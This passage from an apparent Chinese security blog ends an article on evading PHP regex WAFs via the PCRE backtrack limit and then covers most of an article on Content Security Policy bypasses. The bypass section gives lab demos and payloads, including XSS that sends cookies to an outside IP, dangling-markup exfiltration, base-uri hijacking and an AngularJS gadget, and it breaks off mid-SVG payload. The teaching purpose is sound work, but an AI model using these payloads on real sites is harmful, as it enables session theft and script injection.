class="line">php &gt; var_dump(ini_get(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure><p>当回溯次数大于1000000会有什么问题呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*a/s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>.str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>)));  <span class="comment">// 贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*?a/s&#x27;</span>,str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>).<span class="string">&#x27;a&#x27;</span>));  <span class="comment">// 非贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure><p>这里返回了false，并非正常匹配上返回的1，不匹配返回的0，官方文档也对这现象做出了解释：</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013100741170.png" class="" title="image-20211013100741170"><p>所以我们也可以通过该特性绕过一些限制，比如基于php的waf：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以输入类似<code>SELECT * FROM XXX /*aaaaaaa......</code>的payload使回溯次数超过限制，从而返回false绕过if判断，类似还有非贪婪模式的错误用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 可以使用<code>UNION/*aaaaa......*/SELECT</code>增加回溯次数来绕过限制。</p><p><strong>修复方法</strong></p><p>我们可以通过全等号来判断<code>preg_match</code>的返回值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://blog.csdn.net/liuxiao723846/article/details/83308081" >正则引擎：DFA与NFA<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://blog.csdn.net/zpflwy1314/article/details/82665254" >DFA与NFA的比较<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" >PHP利用PCRE回溯次数限制绕过某些安全限制<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSP策略及绕过方法</title>
      <link href="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
      <url>/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>XSS是最常见、危害最大的网页安全漏洞，想要抵御它们，要采取非常多编程措施，非常麻烦。那么，有没有可以从根本上解决问题，浏览器自动禁止外部注入恶意脚本的方法呢？CSP应运而生。</p><h2 id="什么是CSP"><a href="#什么是CSP" class="headerlink" title="什么是CSP"></a>什么是CSP</h2><p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，它实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，哪些不可以。</p><h2 id="CSP策略组成"><a href="#CSP策略组成" class="headerlink" title="CSP策略组成"></a>CSP策略组成</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;指令范围&gt; &lt;内容源&gt; </span><br></pre></td></tr></table></figure><h3 id="指令范围"><a href="#指令范围" class="headerlink" title="指令范围"></a>指令范围</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">script-src：外部脚本</span><br><span class="line">style-src：样式表</span><br><span class="line">img-src：图像</span><br><span class="line">media-src：媒体文件（音频和视频）</span><br><span class="line">font-src：字体文件</span><br><span class="line">object-src：插件（比如 Flash）</span><br><span class="line">child-src：框架</span><br><span class="line">frame-ancestors：嵌入的外部资源（比如&lt;frame&gt;、&lt;iframe&gt;、&lt;embed&gt;和&lt;applet&gt;）</span><br><span class="line">connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</span><br><span class="line">worker-src：worker脚本</span><br><span class="line">manifest-src：manifest 文件</span><br><span class="line">dedault-src：默认配置</span><br><span class="line">frame-ancestors：限制嵌入框架的网页</span><br><span class="line">base-uri：限制&lt;base#href&gt;</span><br><span class="line">form-action：限制&lt;form#action&gt;</span><br><span class="line">block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</span><br><span class="line">upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</span><br><span class="line">plugin-types：限制可以使用的插件格式</span><br><span class="line">sandbox：浏览器行为的限制，比如不能有弹出窗口等。</span><br></pre></td></tr></table></figure><h3 id="内容源"><a href="#内容源" class="headerlink" title="内容源"></a>内容源</h3><p>内容源主要由[源列表] [关键字] [数据]组成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">关键字(需要用单引号包裹)</span><br><span class="line">&#39;none&#39;</span><br><span class="line">代表空集；即不匹配任何 URL</span><br><span class="line">&#39;self&#39;</span><br><span class="line">代表和文档同源，包括相同的 URL 协议和端口号</span><br><span class="line">&#39;unsafe-inline&#39;</span><br><span class="line">允许使用内联资源，如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素</span><br><span class="line">&#39;unsafe-eval&#39;</span><br><span class="line">允许使用 eval() 等通过字符串创建代码的方法</span><br><span class="line">*</span><br><span class="line">星号表示允许任何URL资源，没有限制</span><br><span class="line">源列表</span><br><span class="line">http:&#x2F;&#x2F;*.foo.com （匹配所有使用 http协议加载 foo.com 任何子域名的尝试。）</span><br><span class="line">mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）</span><br><span class="line">https:&#x2F;&#x2F;store.foo.com （匹配所有使用 https协议访问 store.foo.com 的尝试。）</span><br><span class="line">......    </span><br><span class="line">数据</span><br><span class="line">data:</span><br><span class="line">仅允许数据模式（如Base64编码的图片）方式加载资源</span><br><span class="line">mediastream:</span><br><span class="line">允许mediastream: URI作为内容来源</span><br></pre></td></tr></table></figure><h3 id="实现demo"><a href="#实现demo" class="headerlink" title="实现demo"></a>实现demo</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">通过响应头实现：</span><br><span class="line">Content-Security-policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;;<span class="comment">&lt;!--关键字作为内容源--&gt;</span></span><br><span class="line">Content-Security-policy: default-src &#x27;self&#x27;; script-src allowed.com;<span class="comment">&lt;!--源列表作为内容源--&gt;</span></span><br><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; img-src &#x27;self&#x27; data:; media-src mediastream: <span class="comment">&lt;!--数据作为内容源--&gt;</span></span><br><span class="line">通过html元标签实现：</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://*; child-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>本文未说明代码的例子由下面demo代码改造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;session&#x27;</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;session&#x27;</span>,md5(rand(<span class="number">0</span>,<span class="number">1000</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(<span class="string">&quot;Content-Security-Policy: script-src &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your POST content&quot;</span>.@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x01-重定向绕过"><a href="#0x01-重定向绕过" class="headerlink" title="0x01 重定向绕过"></a>0x01 重定向绕过</h3><p><strong>条件</strong></p><p>1.可以执行任意js脚本，但由于CSP无法数据外带</p><p>2.CSP为<code>script-src &#39;unsafe-inline&#39;</code></p><p><strong>绕过方法</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://10.146.110.37:7777?&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--也可用window.location/window.open()跳转方法外带数据--&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160730764.png" class="" title="image-20210614160730764"><h3 id="0x02-meta网页跳转绕过"><a href="#0x02-meta网页跳转绕过" class="headerlink" title="0x02 meta网页跳转绕过"></a>0x02 meta网页跳转绕过</h3><p><strong>绕过条件</strong></p><p>无</p><p><strong>绕过方法（只能跳转，无法携带数据）</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1;url=http://10.146.110.37:7777&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>效果图</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160921062.png" class="" title="image-20210614160921062"><h3 id="0x03-iframe标签绕过"><a href="#0x03-iframe标签绕过" class="headerlink" title="0x03 iframe标签绕过"></a>0x03 iframe标签绕过</h3><p><strong>条件</strong></p><p>1.一个同源站点存在两个页面，其中一个有CSP保护，一个没有且存在xss漏洞</p><p>2.我们要的数据在存在CSP保护的页面中</p><p><strong>绕过方法</strong></p><p>B页面利用iframe加载A页面，绕过A页面CSP策略。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--A.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--B.html--&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);iframe.src=<span class="string">&quot;http://localhost/CSP/demo3/A.html&quot;</span>;<span class="built_in">document</span>.body.appendChild(iframe);<span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">&#x27;flag&#x27;</span>).innerHTML),<span class="number">1000</span>);<span class="comment">//setTimeout是为了等待iframe加载完成</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614161923694.png" class="" title="image-20210614161923694"><p><strong>其他利用方法</strong></p><p>在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http://xxx”页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库：<code>&lt; iframe csp=&quot;script-src &#39;unsafe-inline&#39;&quot; src=&quot;http://xxx&quot;&gt;&lt;/iframe&gt;</code></p><h3 id="0x04-CDN绕过"><a href="#0x04-CDN绕过" class="headerlink" title="0x04 CDN绕过"></a>0x04 CDN绕过</h3><p>一般来说，前端要用到许多的前端框架和库，而部分企业为了效率或者其他原因，会选择使用其他CDN上的js框架，当这些CDN上存在一些低版本的框架时，就可能存在绕过CSP的风险</p><p><strong>利用条件</strong></p><p>1.该CDN服务商在CSP白名单中</p><p>2.CDN服务商存在低版本的js库</p><p><strong>demo</strong></p><p>csp设置</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content-security-policy: script-src &#x27;self&#x27; vimeo.com &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com </span><br></pre></td></tr></table></figure><p>绕过方法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span> </span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162055744.png" class="" title="image-20210614162055744"><p>这里的绕过方法详细说明可以参考链接</p><p><a class="link"   href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" >https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/google/security-research-pocs/tree/master/script-gadgets" >https://github.com/google/security-research-pocs/tree/master/script-gadgets<i class="fas fa-external-link-alt"></i></a></p><h3 id="0x05-不完整script标签绕过"><a href="#0x05-不完整script标签绕过" class="headerlink" title="0x05 不完整script标签绕过"></a>0x05 不完整script标签绕过</h3><p><strong>条件</strong></p><p>1.可控点在合法script标签上方,且其中没有其他标签</p><p>2.XSS页面的CSP <code>script-src</code>只采用了<code>nonce</code>方式</p><p><strong>demo</strong></p><p>csp设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;; script-src &#39;nonce-xxxxx&#39;&quot;&gt;&lt;?php echo $_GET[&#39;a&#39;]?&gt;</span><br><span class="line">&lt;script nonce&#x3D;&#39;xxxxx&#39;&gt;  &#x2F;&#x2F;do some thing&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>利用方法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?a=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/plain,alert(1)</span></span></span><br></pre></td></tr></table></figure><p>我们可以发现&lt;script就会被变成一个属性，值为空，之后的<code>nonce=&#39;xxxxx&#39;</code>会被当成我们输入的script标签中的一个属性，成功绕过<code>script-src</code>，<code>&lt;/script</code>就会被变成一个属性，值为空</p><p>火狐浏览器</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162119762.png" class="" title="image-20210614162119762"><p>上述绕过方法在chrome浏览器不生效，因为在chrome中，虽然第二个&lt;script 被当成了属性名，但依旧会干扰chrome对标签的解析，造成错误，使我们的exp无法成功执行。这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略。</p><p>例如<code>&lt;h1 a=&quot;123&quot; b=&quot;456&quot; a=&quot;789&quot; a=&quot;abc&quot;&gt;123&lt;/h1&gt;</code>，这里a属性的值为123，所以就可以通过如下pyaload绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?a=123<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:text/plain,alert(1)&quot;</span> <span class="attr">a</span>=<span class="string">123</span> <span class="attr">a</span>= </span></span><br></pre></td></tr></table></figure><p>先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个&lt;script赋给了第二个a属性</p><p>chrome浏览器</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162131003.png" class="" title="image-20210614162131003"><p>这里查看页面标签已经嵌入成功，但src却执行不了就很奇怪</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162138551.png" class="" title="image-20210614162138551"><h3 id="0x06-不完整的资源标签获取资源"><a href="#0x06-不完整的资源标签获取资源" class="headerlink" title="0x06 不完整的资源标签获取资源"></a>0x06 不完整的资源标签获取资源</h3><p><strong>条件</strong></p><p>1.可以加载外域资源 (<code>img-src: *</code>)</p><p>2.需要获取页面某处的信息</p><p><strong>demo</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;;script-src &#39;self&#39;; img-src *;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&#39;xss&#39;]?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h2 id&#x3D;&quot;id&quot;&gt;3&lt;&#x2F;h2&gt;</span><br></pre></td></tr></table></figure><p>利用方法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/csp.php?xss=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;//vps_ip?a=</span></span></span><br></pre></td></tr></table></figure><p>注意这里src只有左边的引号</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162156829.png" class="" title="image-20210614162156829"><p>chorme下该payload并不会成功，因为chrome不允许发出的url中含有回车或&lt;</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162208999.png" class="" title="image-20210614162208999"><h3 id="0x07-站点可控静态资源绕过"><a href="#0x07-站点可控静态资源绕过" class="headerlink" title="0x07 站点可控静态资源绕过"></a>0x07 站点可控静态资源绕过</h3><p><strong>条件</strong></p><p>1.可控的静态资源站点在白名单内</p><p><strong>demo</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用方法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>案例中CSP设置了<code>unsafe-eval</code>白名单为<code>www.google-analytics.com</code> ，而<code>www.google.analytics.com</code>中提供了自定义javascript的功能（google会封装自定义的js，所以还需要<code>unsafe-eval</code>），于是可以绕过CSP</p><h3 id="0x08-302跳转绕过"><a href="#0x08-302跳转绕过" class="headerlink" title="0x08 302跳转绕过"></a>0x08 302跳转绕过</h3><p><strong>条件</strong></p><p>1.在script-src允许的域下有需要获取的信息</p><p>2.在script-src允许的域下存在任意重定向</p><p><strong>demo</strong></p><p>a目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- csp.php --&gt;</span><br><span class="line">&lt;?php header(&quot;Content-Security-Policy: default-src &#39;self&#39;;script-src http:&#x2F;&#x2F;127.0.0.1&#x2F;a&#x2F;&quot;);?&gt; </span><br><span class="line">&lt;html&gt; &lt;head&gt; &lt;&#x2F;head&gt; &lt;body&gt;     csp header test  &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- redirect.php --&gt;</span><br><span class="line">&lt;?php header(&quot;Location: &quot; . $_GET[url]);?&gt;</span><br></pre></td></tr></table></figure><p>b目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- test.php --&gt;</span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;script&gt;alert(123)&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><strong>利用方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;a&#x2F;redirect.php?url&#x3D;&#x2F;b&#x2F;test.php</span><br></pre></td></tr></table></figure><p>csp限制了<code>/a/</code>目录，而我们的目标脚本在<code>/b/</code>目录下则如果这时候请求redirect页面去访问<code>/b/</code>下的脚本是可以通过csp的检查的</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162229814.png" class="" title="image-20210614162229814"><h3 id="0x09-Base-uri绕过"><a href="#0x09-Base-uri绕过" class="headerlink" title="0x09 Base-uri绕过"></a>0x09 Base-uri绕过</h3><p><strong>条件</strong></p><ol><li><code>script-src</code>只使用<code>nonce</code></li><li>没有额外设置base-uri</li><li>页面引用存在相对路径的<code>&lt;script&gt;</code>标签</li></ol><p><strong>demo</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;//10.146.110.37/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&#x27;test&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162248786.png" class="" title="image-20210614162248786"><p>如果未设置nonce将无法绕过</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162255139.png" class="" title="image-20210614162255139"><h3 id="0x10-SVG绕过"><a href="#0x10-SVG绕过" class="headerlink" title="0x10 SVG绕过"></a>0x10 SVG绕过</h3><p><strong>条件</strong></p><p>1.可以上传svg图片</p><p><strong>利用方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;&lt;svg version&#x3D;&quot;1.1&quot; id&#x3D;&quot;Layer_1&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; 